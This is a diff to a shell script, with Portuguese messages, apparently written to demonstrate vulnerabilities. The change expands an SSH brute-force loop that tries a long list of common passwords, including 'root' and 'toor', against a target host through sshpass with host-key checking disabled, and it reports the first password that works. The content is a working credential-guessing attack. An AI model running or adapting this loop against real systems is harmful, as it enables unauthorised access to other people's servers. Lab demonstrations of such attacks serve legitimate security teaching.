@@ -9,11 +9,11 @@ echo "🔴 Demonstrando vulnerabilidades críticas..."
 
 # 1. SSH Brute Force
 echo "[1] SSH Brute Force Attack"
-for pwd in "123456789" "password" "admin"; do
+for pwd in "admin" "password" "123456" "qwerty" "letmein" "welcome" "monkey" "dragon" "master" "shadow" "12345" "password123" "admin123" "root" "toor" "pass" "test" "guest" "user" "login" "abc123" "123123" "password1" "1234" "12345678" "senha" "123" "1" "2" "3" "4" "5" "6" "7" "8" "9" "123456789"; do
     echo "  Testando: $pwd"
     if sshpass -p "$pwd" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
        $USER@$TARGET "echo 'ACESSO OBTIDO'" 2>/dev/null; then
-        echo "  ✅ SUCESSO: Senha '$pwd' funcionou!"
+        echo "  ✅ SUCESSO: Senha '$pwd' funcionou após múltiplas tentativas!"
         break
     fi
 done
